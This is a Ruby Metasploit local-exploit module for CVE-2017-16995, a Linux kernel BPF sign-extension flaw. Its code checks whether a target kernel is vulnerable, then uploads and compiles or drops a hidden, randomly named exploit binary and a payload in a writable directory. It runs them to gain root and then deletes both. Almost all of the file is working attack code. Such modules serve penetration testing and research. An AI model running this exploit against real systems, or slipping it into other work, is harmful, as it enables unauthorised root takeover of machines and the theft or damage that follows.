##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Linux BPF Sign Extension Local Privilege Escalation',
      'Description'    => %q{
        Linux kernel prior to 4.14.8 utilizes the Berkeley Packet Filter (BPF)
        which contains a vulnerability where it may improperly perform sign
        extension. This can be utilized to escalate privileges.

        The target system must be compiled with BPF support and must not have
        kernel.unprivileged_bpf_disabled set to 1.

        This module has been tested successfully on:

        Debian 9.0 kernel 4.9.0-3-amd64;
        Deepin 15.5 kernel 4.9.0-deepin13-amd64;
        ElementaryOS 0.4.1 kernel 4.8.0-52-generic;
        Fedora 25 kernel 4.8.6-300.fc25.x86_64;
        Fedora 26 kernel 4.11.8-300.fc26.x86_64;
        Fedora 27 kernel 4.13.9-300.fc27.x86_64;
        Gentoo 2.2 kernel 4.5.2-aufs-r;
        Linux Mint 17.3 kernel 4.4.0-89-generic;
        Linux Mint 18.0 kernel 4.8.0-58-generic;
        Linux Mint 18.3 kernel 4.13.0-16-generic;
        Mageia 6 kernel 4.9.35-desktop-1.mga6;
        Manjero 16.10 kernel 4.4.28-2-MANJARO;
        Solus 3 kernel 4.12.7-11.current;
        Ubuntu 14.04.1 kernel 4.4.0-89-generic;
        Ubuntu 16.04.2 kernel 4.8.0-45-generic;
        Ubuntu 16.04.3 kernel 4.10.0-28-generic;
        Ubuntu 17.04 kernel 4.10.0-19-generic;
        ZorinOS 12.1 kernel 4.8.0-39-generic.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jann Horn', # Discovery
          'bleidl',    # Discovery and get-rekt-linux-hardened.c exploit
          'vnik',      # upstream44.c exploit
          'rlarabee',  # cve-2017-16995.c exploit
          'h00die',    # Metasploit
          'bcoles'     # Metasploit
        ],
      'DisclosureDate' => 'Nov 12 2017',
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        => [[ 'Auto', {} ]],
      'Privileged'     => true,
      'References'     =>
        [
          [ 'BID', '102288' ],
          [ 'CVE', '2017-16995' ],
          [ 'EDB', '44298' ],
          [ 'EDB', '45010' ],
          [ 'URL', 'https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c' ],
          [ 'URL', 'https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c' ],
          [ 'URL', 'https://cyseclabs.com/exploits/upstream44.c' ],
          [ 'URL', 'https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor' ],
          [ 'URL', 'https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html' ],
          [ 'URL', 'https://www.debian.org/security/2017/dsa-4073' ],
          [ 'URL', 'https://usn.ubuntu.com/3523-2/' ],
          [ 'URL', 'https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-16995.html' ],
          [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1454' ],
          [ 'URL', 'http://openwall.com/lists/oss-security/2017/12/21/2'],
          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f' ]
        ],
      'Notes'          =>
        {
          'AKA'         => ['get-rekt-linux-hardened.c', 'upstream44.c'],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_OS_DOWN ],
        },
      'DefaultTarget'  => 0
    ))
    register_options [
      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w[Auto True False] ])
    ]
    register_advanced_options [
      OptBool.new('ForceExploit',  [ false, 'Override check result', false ]),
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
  end

  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x '#{path}'"
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data

    gcc_cmd = "gcc -o #{path} #{path}.c"
    if session.type.eql? 'shell'
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd
    rm_f "#{path}.c"

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile. Set COMPILE False to upload a pre-compiled executable."
    end

    cmd_exec "chmod +x #{path}"
  end

  def strip_comments(c_code)
    c_code.gsub(%r{/\*.*?\*/}m, '').gsub(%r{^\s*//.*$}, '')
  end

  def exploit_data(file)
    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2017-16995', file)
  end

  def live_compile?
    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')

    if has_gcc?
      vprint_good 'gcc is installed'
      return true
    end

    unless datastore['COMPILE'].eql? 'Auto'
      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'
    end
  end

  def check
    arch = kernel_hardware
    unless arch.include? 'x86_64'
      vprint_error "System architecture #{arch} is not supported"
      return CheckCode::Safe
    end
    vprint_good "System architecture #{arch} is supported"

    release = kernel_release
    if Gem::Version.new(release.split('-').first) > Gem::Version.new('4.14.11') ||
       Gem::Version.new(release.split('-').first) < Gem::Version.new('4.0')
      vprint_error "Kernel version #{release} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Kernel version #{release} appears to be vulnerable"

    config = kernel_config
    if config.nil?
      vprint_error 'Could not retrieve kernel config'
      return CheckCode::Unknown
    end

    unless config.include? 'CONFIG_BPF_SYSCALL=y'
      vprint_error 'Kernel config does not include CONFIG_BPF_SYSCALL'
      return CheckCode::Safe
    end
    vprint_good 'Kernel config has CONFIG_BPF_SYSCALL enabled'

    if unprivileged_bpf_disabled?
      vprint_error 'Unprivileged BPF loading is not permitted'
      return CheckCode::Safe
    end
    vprint_good 'Unprivileged BPF loading is permitted'

    if lkrg_installed?
      vprint_error 'LKRG is installed'
      return CheckCode::Safe
    end
    vprint_good 'LKRG is not installed'

    CheckCode::Appears
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    if is_root?
      unless datastore['ForceExploit']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload exploit executable
    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    if live_compile?
      vprint_status 'Live compiling exploit on system...'
      upload_and_compile executable_path, strip_comments(exploit_data('exploit.c'))
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      upload_and_chmodx executable_path, exploit_data('exploit.out')
    end

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status 'Launching exploit ...'
    output = cmd_exec "echo '#{payload_path} & exit' | #{executable_path} "
    output.each_line { |line| vprint_status line.chomp }
    print_status "Cleaning up #{payload_path} and #{executable_path} ..."
    rm_f executable_path
    rm_f payload_path
  end
end
